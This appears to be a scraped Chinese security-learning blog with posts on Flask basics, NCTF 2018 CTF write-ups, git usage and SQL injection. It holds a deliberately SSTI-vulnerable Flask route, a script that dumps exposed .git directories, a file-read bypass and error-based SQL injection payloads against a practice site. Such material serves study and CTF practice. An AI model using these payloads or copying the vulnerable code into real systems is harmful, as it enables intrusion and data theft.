+  
+    <article id="post-flask从0到无" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/14/flask从0到无/" class="article-date">
+  <time datetime="2018-12-13T16:00:00.000Z" itemprop="datePublished">2018-12-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/14/flask从0到无/">Flask从零到无</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="零基础学起"><a href="#零基础学起" class="headerlink" title="零基础学起"></a>零基础学起</h1><p>学习flask我选择了 pycharm，学生的话可以免费下载专业版。废话不多说了。  </p>
+<p>环境：python 3.6+<br>基础：0-<br>日期：2018.12.14 </p>
+<h1 id="flask入门"><a href="#flask入门" class="headerlink" title="flask入门"></a>flask入门</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>pycharm安装flask会自动导入了flask所需的模块，所以我们只需要命令安装所需要的包就可以了，建议用python3.6学习而不是2.7，毕竟django都快要不支持2.7了，早换早超生。</p>
+<p>自动导入的也是python 3.6。<br><img src="https://i.imgur.com/VgalqNv.png" alt></p>
+<p>运行这边会出小错，因为此时我们还没有安装flask包，</p>
+<p><img src="https://i.imgur.com/9C4jrbP.png" alt></p>
+<p>这样就可以正常运行了，运行成功便会返回 </p>
+<pre><code> * Debug mode: off
+ * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET / HTTP/1.1&quot; 200 -
+127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</code></pre><p>此时可以在web上运行hello world了，访问<a href="http://127.0.0.1:5000。可以看到打印出Hello" target="_blank" rel="noopener">http://127.0.0.1:5000。可以看到打印出Hello</a> World</p>
+<h2 id="route装饰器路由"><a href="#route装饰器路由" class="headerlink" title="route装饰器路由"></a>route装饰器路由</h2><pre><code>@app.route(&apos;/&apos;)</code></pre><p>使用 route() 装饰器告诉 Flask 什么样的URL 能触发我们的函数。 route() 装饰器把一个函数绑定到对应的 URL 上，这句话相当于路由，一个路由跟随一个函数，如</p>
+<pre><code>@app.route(&apos;/&apos;)
+def test()&quot;
+   return 123</code></pre><p>访问127.0.0.1:5000/ 则会输出123，我们修改一下规则</p>
+<pre><code>@app.route(&apos;/test&apos;)
+def test()&quot;
+   return 123</code></pre><p>这个时候访问127.0.0.1:5000/test 会输出123。<br>此外还可以设置动态url，</p>
+<pre><code>@app.route(&quot;/hello/&lt;username&gt;&quot;)
+def hello_user(username):
+  return &quot;user:%s&quot;%username</code></pre><p>根据url里的输入，动态辨别身份，此时便可以看到如下页面：</p>
+<p><img src="https://i.imgur.com/P2XIEeU.png" alt></p>
+<p>或者可以使用int型，转换器有下面几种：</p>
+<pre><code>int    接受整数
+float    同 int ，但是接受浮点数
+path    和默认的相似，但也接受斜线
+
+@app.route(&apos;/post/&lt;int:post_id&gt;&apos;)
+def show_post(post_id):
+    # show the post with the given id, the id is an integer
+    return &apos;Post %d&apos; % post_id</code></pre><h2 id="main入口"><a href="#main入口" class="headerlink" title="main入口"></a>main入口</h2><p>当.py文件被直接运行时，if <strong>name</strong> == ‘<strong>main</strong>‘之下的代码块将被运行；当.py文件以模块形式被导入时，if <strong>name</strong> == ‘<strong>main</strong>‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if <strong>name ==’</strong>main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。    </p>
+<pre><code>if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><p>测试的时候，我们可以使用debug，方便调试，增加一句</p>
+<pre><code>app.debug = True
+或者（效果是一样的）
+app.run(debug=True)</code></pre><p>这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。</p>
+<pre><code>app.run(host=&apos;0.0.0.0&apos;)</code></pre><p>这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。</p>
+<h2 id="http请求方法"><a href="#http请求方法" class="headerlink" title="http请求方法"></a>http请求方法</h2><p>页面需要get请求或者post请求也可以由路由来解决，通过 route() 装饰器传递 methods 参数。如我们要在登录页面使用get或者post登录输入。</p>
+<pre><code>@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def login():
+    if request.method == &apos;POST&apos;:
+        do_the_login()
+    else:
+        show_the_login_form()</code></pre><h2 id="模版渲染"><a href="#模版渲染" class="headerlink" title="模版渲染"></a>模版渲染</h2><p>何为模版渲染  点击连接—&gt;&gt;&gt;  <a href="https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://shuaizhupeiqi.github.io/2018/11/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p>
+<p>你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:</p>
+<p>简单的模版渲染示例</p>
+<pre><code>from flask import render_template
+
+@app.route(&apos;/hello/&apos;)
+@app.route(&apos;/hello/&lt;name&gt;&apos;)
+def hello(name=None):
+        return render_template(&apos;hello.html&apos;, name=name)</code></pre><h1 id="flask简单实例"><a href="#flask简单实例" class="headerlink" title="flask简单实例"></a>flask简单实例</h1><p>我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名，所以我们先从flask模版渲染入手深入剖析。</p>
+<p>首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p>
+<pre><code>├── app.py  
+├── static  
+│   └── style.css  
+└── templates  
+    └── index.html  </code></pre><p><img src="https://i.imgur.com/vWxXdEc.png" alt></p>
+<p>我们写一个index.html文件写templates文件夹中。</p>
+<pre><code>&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;{{title}} - 小猪佩奇&lt;/title&gt;
+  &lt;/head&gt;
+ &lt;body&gt;
+      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre><p>里面有两个参数需要我们渲染，user.name，以及title</p>
+<p>我们在app.py文件里进行渲染。</p>
+<pre><code>@app.route(&apos;/&apos;)
+@app.route(&apos;/index&apos;)#我们访问/或者/index都会跳转
+def index():
+   user = {&apos;name&apos;: &apos;小猪佩奇&apos;}#传入一个字典数组
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=user)</code></pre><p><img src="https://i.imgur.com/RyvwVaU.png" alt></p>
+<p>这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。<br>jinja2模板同样支持控制语句，在｛% %｝中输入我们的代码。如</p>
+<pre><code>{% if title %}
+    <title>{{title}} - xzpq</title>
+    {% else %}
+    <title>Welcome to xzpq</title>
+    {% endif %}</code></pre><p>如果传入title参数那么执行</p>
+<pre><code>&lt;title&gt;{{title}} - xzpq&lt;/title&gt; </code></pre><p>否则执行</p>
+<pre><code>&lt;title&gt;Welcome to xzpq&lt;/title&gt; </code></pre><p>最后执行下面未写出。</p>
+<p>本文暂且到这里，主要是为了配合ssti模板注入而了解flask注入。看继续参考博文SSTI模板注入。</p>
+<p>测试的代码贴上</p>
+<pre><code>from flask import Flask
+from flask import render_template
+from flask import request
+from flask import render_template_string
+app = Flask(__name__)
+
+@app.route(&apos;/login&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])
+def login():
+    if request.method == &apos;POST&apos;:
+        do_the_login()
+    else:
+        show_the_login_form()
+
+@app.route(&apos;/&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+@app.route(&apos;/index&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])#我们访问/或者/index都会跳转
+def index():
+   return render_template(&quot;index.html&quot;,title=&apos;Home&apos;,user=request.args.get(&quot;key&quot;))
+
+
+@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])
+def test():
+    template = &apos;&apos;&apos;
+        &lt;div class=&quot;center-content error&quot;&gt;
+            &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;
+            &lt;h3&gt;%s&lt;/h3&gt;
+        &lt;/div&gt; 
+    &apos;&apos;&apos; %(request.url)
+    return render_template_string(template)
+
+
+if __name__ == &apos;__main__&apos;:
+    app.debug = True
+    app.run()</code></pre><hr>
+<p>参考：<a href="http://www.pythondoc.com/flask-mega-tutorial/" target="_blank" rel="noopener">http://www.pythondoc.com/flask-mega-tutorial/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/14/flask从0到无/" data-id="ck0l0oh9d000opy2i4zoia8yv" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-南邮CTF-2018" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/06/南邮CTF-2018/" class="article-date">
+  <time datetime="2018-12-05T16:00:00.000Z" itemprop="datePublished">2018-12-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/06/南邮CTF-2018/">南邮CTF-2018</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h1><p>进入网站是一个时钟。<br><img src="https://i.imgur.com/0Pw6skq.png" alt><br>并没什么思路，只能拿工具扫一下了。.git禁止访问，可能存在git源码泄露。用lijiejie的工具，下载源码发现没啥乱用，一个readme.txt。本来没想点进去，发现确实有提示</p>
+<p>Allsource files areingit tag1.0</p>
+<p>这意思是所有的源码都在 tag1.0中，也就是不在这个版本中。也就是说这个版本他把仓库东西给删除了，你如果想要1.0版本必须要回溯到1.0版本。不过既然有.git按道理说都是可以看到的。一个工具给大家。</p>
+<pre><code>#!/bin/bash
+#
+# Author: Denny Huang &lt;denny0223@gmail.com&gt;
+# Wed Sep 17 2014
+# MIT License
+function downloadBlob {
+    echo downloadBlob $1
+    mkdir -p ${1:0:2}
+    cd $_
+
+    wget -q -nc $domain/.git/objects/${1:0:2}/${1:2}
+
+    cd ..
+}
+
+function parseTree {
+    echo parseTree $1
+
+    downloadBlob $1
+
+    while read line
+    do
+        type=$(echo $line | awk &apos;{print $2}&apos;)
+        hash=$(echo $line | awk &apos;{print $3}&apos;)
+
+        [ &quot;$type&quot; = &quot;tree&quot; ] &amp;&amp; parseTree $hash || downloadBlob $hash
+    done &lt; &lt;(git cat-file -p $1)
+}
+
+function parseCommit {
+    echo parseCommit $1
+
+    downloadBlob $1
+
+    tree=$(git cat-file -p $1| sed -n &apos;1p&apos; | awk &apos;{print $2}&apos;)
+    parseTree $tree
+
+    parent=$(git cat-file -p $1 | sed -n &apos;2p&apos; | awk &apos;{print $2}&apos;)
+
+    [ ${#parent} -eq 40 ] &amp;&amp; parseCommit $parent
+}
+
+[ -z $1 ] &amp;&amp; echo -e &quot;missing target url\n\n\
+Usage: scrabble &lt;url&gt;\n\
+Example: scrabble http://example.com/\n\n\
+You need make sure target url had .git folder&quot;\
+&amp;&amp; exit
+
+domain=$1
+ref=$(curl -s $domain/.git/HEAD | awk &apos;{print $2}&apos;)
+
+lastHash=$(curl -s $domain/.git/$ref)
+
+git init
+
+cd .git/objects/
+
+parseCommit $lastHash
+
+cd ../../
+
+echo $lastHash &gt; .git/refs/heads/master
+
+git reset --hard</code></pre><p>用法如图<br>注意 scrabble 是我上面脚本的名字。无需后缀，要在linux bash运行<br><img src="https://i.imgur.com/DN5IB6S.png" alt></p>
+<p>之后便可以当作自己的git仓库来使用。如 git log</p>
+<p><img src="https://i.imgur.com/xJhVeKY.png" alt></p>
+<p>上面是我本地测试自己的代码。我们回归正题。因为题目已经关了，没法复现题目中的git,意思就是git log，查看到各个版本的版本号，然后 </p>
+<p>git show HEAD 版本号查看进行了什么修改增加便可以看到flag。</p>
+<p>root@xiaozhupeiqi:/scrabble# git show HEAD cf36b7a28707d581e4c5be4a2061ad41c9d386e2</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11900959-7ad0cc3749de9cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/457" alt></p>
+<h1 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h1><p><img src="https://i.imgur.com/ZI77p9c.png" alt></p>
+<p>前言：比赛结束后测试的，自我认为是环境问题，使用别人的poc也跑不出来flag，就当自己练习脚本了。</p>
+<p>先贴出脚本自写（未验证准确性）</p>
+<pre><code>import requests
+import re
+import time
+url=&apos;http://127.0.0.1/2/index.php&apos;
+s=requests.Session()
+r=s.get(url)
+while(1):
+    a = r.content[1600:4250].decode(encoding=&apos;utf-8&apos;)
+    matchp = re.findall(r&apos;[0-9\+\-\*]&apos;,a)
+    a=&quot;&quot;
+    for i in matchp:
+        a=a+i
+    b=&quot;&quot;
+    map=re.findall(r&apos;[1-9]+[0]*[1-9]+[0]*[1-9]+[0]*[1-9]+[\+\-\*]*&apos;,a)
+    for i in map:
+        b=b+i
+    b=&apos;9223372036854775807+&apos;+b
+    print b
+    print eval(b)
+
+    c=eval(b)
+
+    payload={&apos;input&apos;:&apos;1111111111111111111111&apos;,&apos;ans&apos;:c}
+    r=s.post(url,data=payload)
+    time.sleep(1.5)
+    print r.content.decode(encoding=&apos;utf-8&apos;)</code></pre><p>分析：<br>此题中一看场面应该是自写脚本然后计算结果快速提交。但是肯定会有考其他的知识点。以后看到ctf先扫一波，扫到源码</p>
+<p>源码中有一很重要的知识点<br>知识点 1</p>
+<pre><code>if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;]){</code></pre><p>intval 是防止程序溢出的函数，32位系统溢出最大：2147483647 64位系统溢出最大：9223372036854775807，检测为64位系统，所以你提交22位的数字会自动转化为 9223372036854775807，所以脚本计算的时候要使用 9223372036854775807 而不是22位自己input的数字。</p>
+<p>知识点2 </p>
+<pre><code>if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1){
+            session_destroy();
+            echo &apos;
+            &lt;script language=&quot;javascript&quot;&gt;  
+            alert(&quot;你手速太快啦，服务器承受不住!!!&quot;);  
+            window.history.back(-1); &lt;/script&gt; &apos;;
+        }</code></pre><p>源码中指定不能提交速度太快，在github上下载的所有源码规定的是如果你提交五次正确答案就给你flag，但是你不能提交太快，我们使用函数<br>time.sleep(1.5)，定义1.5S 提交一次。</p>
+<p>知识点3 </p>
+<p>正则，我是没写过几次正则的，所以写的很辣鸡，是真的辣鸡，匹配有点鸡肋，说不清自己体会把。。</p>
+<p>知识点4</p>
+<p>必须要做一个session，因为需要一个用户提交五次及以上。</p>
+<p>知识点5</p>
+<p>findall函数要学清楚，细心！就完事。</p>
+<p>脚本运行截图</p>
+<p><img src="https://i.imgur.com/rO6sIC8.png" alt><br>不要问我为什么没算对，应该是直接下载源码环境不对，算是肯定算对了的，网上下载的poc也同样没跑出来flag，应该是环境嗯，环境问题。</p>
+<h1 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h1><p>进去之后发现网站跳转302，抓包，看到最下面，（我发现CTF不细心的人做不出来还会原地爆炸）<br><img src="https://i.imgur.com/BEAt4p8.png" alt></p>
+<!-- post me viewsource -->
+<p>post 一个 viewsource参数就好看到源码</p>
+<p><img src="https://i.imgur.com/wH9nOh1.png" alt></p>
+<pre><code>if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;]))){
+    header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);
+}else{
+    echo &apos;great&apos;;
+}</code></pre><p>这玩意是**骗人的，不用绕我日！<br>自己体会。利用最后一句源码 就是读取文件就完事</p>
+<pre><code>echo file_get_contents(de_code($_GET[&apos;file_&apos;]));</code></pre><p>将function逆向编写，然后顺理成章的下面就会读取文件。flag.php就在当前文件下，直接读就行了</p>
+<p>逆向代码</p>
+<pre><code>for($i=0;$i&lt;strlen($value);$i++){
+        $result .= chr(ord($value[$i])+$i*2);
+    }
+    $result=base64_encode($result);
+    echo $result;</code></pre><p>value输入想读的文件输入flag.php 转换成Zm5lbTZ6dH4=<br>然后提交file_=Zm5lbTZ6dH4=就可读取flag.php<br>千万不要被骗了，哭了！<br><img src="https://i.imgur.com/L3m1MHA.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/06/南邮CTF-2018/" data-id="ck0l0oh9t001opy2ip9hh2iwj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-git工具的使用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/04/git工具的使用/" class="article-date">
+  <time datetime="2018-12-03T16:00:00.000Z" itemprop="datePublished">2018-12-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/04/git工具的使用/">git使用与部署github</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="GIT是什么"><a href="#GIT是什么" class="headerlink" title="GIT是什么"></a>GIT是什么</h1><p>GIT是先进的分布式版本控制系统，既然是分布式控制系统，那么就是没有中央服务器的，每个终端都可以是一个完整的库，如果家庭单位两台电脑如何修改库呢，只需要推送给对方进行修改即可。既然是分布式，每台电脑就可以是一个库那么也就自然不需要连接服务器进行上传了，不过接下来我们要介绍到上传github上。</p>
+<h1 id="git有什么好处"><a href="#git有什么好处" class="headerlink" title="git有什么好处"></a>git有什么好处</h1><p>git最大的好处就是方便，好吧，如何方便呢，他可以自由回退各个版本，就是你对一个库的任何修改他都会保存，如果你用不到那么可以不用知道他的存在，如果你需要，他可以调用出来你以前的版本。举个例子。</p>
+<p>一个版本库存放一个项目，并且已经推送到github上供人下载，此时你要更新到下一个版本，进行修改推送到网站上，但是你发现有一个大bug，但是时间太久记不清修改了哪里，毕竟那么多细节，此时就可以用git按照日期回退版本，在进行从新开发。对任意时间段的版本重置。并且你可以对每次改动增加一个备注，比如：</p>
+<pre><code>版本    文件名      操作人   说明             日期
+1       test.txt   guest   增加项目1        2018.1.1
+2       test.txt   admin   删除第五行       2018.2.1
+2       test.txt   admin   修改管理员密码    2018.2.1</code></pre><p>这样可以极大方便开发人员操作人员的修改推送。</p>
+<h1 id="windows下gitbash"><a href="#windows下gitbash" class="headerlink" title="windows下gitbash"></a>windows下gitbash</h1><p>在windows下安装git工具，下载安装网上教程自寻。</p>
+<p>然后打开gitbash，一个git命令行，一些linux命令 windows命令可以使用，自己体会下。</p>
+<p>一切的操作都基于git bash操作，接下来我们详解git命令。</p>
+<h1 id="git命令学习"><a href="#git命令学习" class="headerlink" title="git命令学习"></a>git命令学习</h1><p>git init //把这个目录变成git可以管理的仓库<br><img src="https://i.imgur.com/Bdyf3dH.png" alt><br>.git目录是Git来跟踪管理版本的，不要轻易改动。<br>2.创建文件夹 mkdir test<br>  创建文件 touch 1.txt</p>
+<p><img src="https://i.imgur.com/WveLFit.png" alt><br>3.传送到我们的仓库</p>
+<p>git add 1.txt //将1.txt添加到暂存区。<br>如果想要将本文件夹全部添加到暂存区那么可以 git add .</p>
+<p>git commit告诉Git 添加到仓库<br>git commit -m ‘pqtest’//把文件提交到仓库，pqtest为本次修改的备注，通常用来备注复了某某bug等   </p>
+<p>还有一步推送出去，下面文章的github会讲到。<br>4.status查看当前状态<br>git status //查看状态是否有文件未提交<br><img src="https://i.imgur.com/GCr4PwH.png" alt></p>
+<p>git bash支持许多linux命令，自带vi我们vi 1.txt修改 增加几个1111<br>git diff 1.txt即可看到增加删减的东西。<br>或者 git diff即可看到所有有变动的更改。<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/cJBSZ88MaJLhkCtaVTf9c6ai8KQGDREIrJVhzhOyT.E!/b/dFIBAAAAAAAA&ek=1&kp=1&pt=0&bo=kARRAQAAAAADF*Y!&tl=1&vuin=275640346&tm=1543928400&sce=60-2-2&rf=viewer_4" alt></p>
+<p>5.查看更改日志</p>
+<p>git log 查看更改日志。<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/wKOeGuA3zT0pUoGygPgg.gPJwTiCS59LQB5sxdjp6Bw!/b/dLYAAAAAAAAA&ek=1&kp=1&pt=0&bo=8wQjAgAAAAADF.Q!&tl=1&vuin=275640346&tm=1543932000&sce=60-2-2&rf=viewer_4" alt><br>6.版本回退</p>
+<p>git reset –hard HEAD^ //版本回退到上一个版本。<br>回退之后 git log也相应地删除。</p>
+<p>git reflog 来查看历史操作，我们可以看到回退的版本。可以再次回退到之前的版本。</p>
+<p>git reset –hard 96ddb1f</p>
+<p>7.撤销操作<br>如果你不小心修改了文件，但是忘记修改了哪里很细小的细节。有两种方法。<br>第一种可以版本回退到上一个版本 ：git reset –hard HEAD^<br>第二种撤销文件操作，git checkout – 1.txt （比如我修改的是1.txt）</p>
+<p><img src="https://i.imgur.com/H8vhck3.png" alt></p>
+<h1 id="github管理"><a href="#github管理" class="headerlink" title="github管理"></a>github管理</h1><p>1.我们先从本地连接到github，首先创建一个项目/库<br><img src="https://i.imgur.com/8SnS1Ht.png" alt></p>
+<p><img src="https://i.imgur.com/3f9DQ7U.png" alt></p>
+<p>2.然后打开gitbash 输入命令：ssh-keygen -t rsa -C “<a href="mailto:xxx@qq.com" target="_blank" rel="noopener">xxx@qq.com</a>“//填写自己注册的邮箱即可</p>
+<p>一路回车<br><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/Jrita1ue.P*6PxIuxlQVtF18OxYhW49.xhsg*29wspY!/b/dLYAAAAAAAAA&ek=1&kp=1&pt=0&bo=2AW1AgAAAAADF1g!&tl=1&vuin=275640346&tm=1543899600&sce=60-2-2&rf=viewer_4" alt></p>
+<p>其中（/c/users/1/.ssh/id_rsa）目录存放密钥。//我自己默认的路径，上图中第四行</p>
+<p>打开 <a href="https://github.com/settings/ssh/new" target="_blank" rel="noopener">https://github.com/settings/ssh/new</a></p>
+<p>title 写备注，Key填写刚刚连接的时候目录下的密钥，id_rsa.pub文件打开复制密钥，全部保存到Key然后添加密钥即可。</p>
+<p>然后检验是否成功连接 输入命令 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><img src="https://i.imgur.com/joU0Baw.png" alt></p>
+<p>如果你是第一次，输入yes就可以了，我这个是之前配置过所以直接显示successful,如果你的是出现不是这些内容，有可能是显示权限问题什么的，就应该是我上面提到的那种情况，你看一下你生成密钥时是否操作正确，目录下是否有那个known_hosts这个文件。</p>
+<p>3.最后配置config</p>
+<pre><code>git config –global user.name “用户名”
+git config –global user.email “邮箱”    </code></pre><p>配置完成输入命令 git config –global –list查看是否配置成功。Git和github配置完了，现在可以在github托管我们的项目了。</p>
+<p>4.打开一个文件夹打开git bash，使用输入命令<br>git init来使他成为一个仓库。</p>
+<p>5.然后远程连接到仓库。</p>
+<p>输入命令：git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test</p>
+<p>shuaizhupeiqi，是我的用户名，test是仓库名字</p>
+<p><img src="http://a1.qpic.cn/psb?/V14K5DCn0YAkcr/rH5NFBkKNMsvoRFoNokjphwr3cz37BRopQkMZ1U.GXk!/b/dFQBAAAAAAAA&ek=1&kp=1&pt=0&bo=fgFjAAAAAAADFy4!&tl=1&vuin=275640346&tm=1543924800&sce=60-2-2&rf=viewer_4" alt></p>
+<p>6.由于创建仓库的时候，默认创建了readme.md,所以本地是与仓库不同步的。我们先同步一下。</p>
+<p>git pull <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test</p>
+<p>7.上传更新</p>
+<p>第一步：git   add  . //后面是一个英文的.<br>第二步：git   commit   –m   “1”   (如果提交单个文件1，就这样写；如果提交所有文件，写成：git   commit   –m  *)<br>第三步：git   push   <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shuaizhupeiqi/test//这样就可以推送上去了。  </p>
+<p><img src="http://a3.qpic.cn/psb?/V14K5DCn0YAkcr/M4vqusCrfUGeaBBFkQiuKiX4mqnMNk.Enm*Cf0JupbE!/b/dD4BAAAAAAAA&ek=1&kp=1&pt=0&bo=VgUlAwAAAAADF0c!&tl=1&vuin=275640346&tm=1543924800&sce=60-2-2&rf=viewer_4" alt><br>这样就完成了。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/04/git工具的使用/" data-id="ck0l0oh9c000mpy2ihqw48yc8" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂/">杂</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/03/sql注入/" class="article-date">
+  <time datetime="2018-12-02T16:00:00.000Z" itemprop="datePublished">2018-12-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/03/sql注入/">sql注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>注入千百样，本文仅记录一些姿势供个人查阅。轻喷。</p>
+<h1 id="HTTP分割注入"><a href="#HTTP分割注入" class="headerlink" title="HTTP分割注入"></a>HTTP分割注入</h1><p>题目地址实验吧：加了料的报错注入。<br>地址：<a href="http://ctf5.shiyanbar.com/web/baocuo/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/baocuo/index.php</a></p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn0YAkcr/hM1RxRZ4qdSGafHA6s7uXUMdGnBa6U2Jb.rkqC2NQ8s!/b/dDYBAAAAAAAA&bo=GQPdAAAAAAADF*U!&rf=viewer_4" alt></p>
+<p>查看页面源代码，给出了我们sql查询语句很常规</p>
+<pre><code>&lt;!-- $sql=&quot;select * from users where username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;  --&gt;</code></pre><p>根据提示 post传一个username和password然后开始注入</p>
+<p>语句：</p>
+<pre><code>username=admin&apos; or &apos;&amp;password=admin</code></pre><p>显示 You are our member, welcome to enter，可以说明单引号空格没有被过滤，不过既然是报错注入，那么加个单引号试试。</p>
+<p>语句：</p>
+<pre><code>username=admin&apos;&amp;password=admin</code></pre><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’ at line 1</p>
+<p>接下来写报错语句<br>语句：</p>
+<pre><code>username=admin&apos;and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &apos;&amp;password=admin</code></pre><p>一翻测试之后发现,有个神奇的过滤，username过滤了（），password过滤了一切报错函数。</p>
+<p>可以组合一下。username写函数updatexml。password写（），但是怎么合并为一起呢，想到sql语句是  </p>
+<pre><code>select * from users where username=&apos;$username&apos; and password=&apos;$password  
+$username=updatexm/*,$password=*/...这样sql语句会变成
+
+select * from users where username=&apos;updatexm/* and password=&apos;*/...</code></pre><p>这样便可以注释掉中间的代码一种骚姿势，接下来继续正常注入。</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or &apos;</code></pre><p><img src="http://47.106.185.69/1/./img/1559184520.jpg" alt></p>
+<p>成功爆出来数据库名称。</p>
+<p>语句</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>=号被过滤，可以使用正则注入，也就是=换成regexp</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp&apos;error_based_hpf&apos;),0x7e),1) or &apos;</code></pre><p>这里使用group_concat来爆出所有的表名字</p>
+<pre><code>XPATH syntax error: &apos;~ffll44jj,users~&apos;</code></pre><p>查列</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name regexp&apos;ffll44jj&apos;),0x7e),1) or &apos;
+
+XPATH syntax error: &apos;~value~&apos;</code></pre><p>查数据</p>
+<pre><code>username=&apos; and updatexml/*&amp;password=*/(1,concat(0x7e,(select value from 
+ffll44jj),0x7e),1) or &apos;
+
